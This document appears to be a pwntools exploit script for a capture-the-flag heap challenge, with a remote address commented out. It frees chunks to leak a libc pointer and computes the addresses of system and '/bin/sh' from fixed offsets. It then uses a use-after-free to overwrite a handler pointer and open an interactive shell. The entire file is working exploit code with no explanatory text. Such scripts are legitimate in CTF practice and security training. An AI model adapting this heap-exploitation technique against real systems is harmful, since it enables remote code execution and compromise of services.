from pwn import *

r = process('./share/chal')
# r = remote('10.113.184.121', 10059)

def register(idx, length, name):
    r.recvuntil(b'choice: ')
    r.send(b'1\x00')
    r.recvuntil(b'Index: ')
    r.sendline(str(idx).encode() + b'\x00')
    r.recvuntil(b'Nmae Length: ')
    r.sendline(str(length).encode() + b'\x00')
    r.recvuntil(b'Name: ')
    r.send(name)
    
def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')
    
def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'3\x00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\x00')

# find sh_addr and system_addr
for i in range(0x2):
    register(i, 0x410, b'a\x00')
for i in range(0x2):
    delete(i)
register(0, 0x410, b'a')
trigger_event(0)

r.recvuntil(b'Name: ')
leak_address = u64(r.recvline(1)[:-1].ljust(8, b'\x00'))
print(hex(leak_address))
libc_base = leak_address - 0x1ecb61
system_addr = libc_base + 0x52290
sh_addr = libc_base + 0x1b45bd
print("libc_base: " + hex(libc_base))
print("system_addr: " + hex(system_addr))
print("sh_addr: " + hex(sh_addr))
raw_input()

for i in range(0x2):
    register(i, 0x30, b'a\x00')
for i in range(0x2):
    delete(i)
register(1, 0x18, p64(0) + p64(sh_addr) + p64(system_addr))
trigger_event(0)
# raw_input()

r.interactive()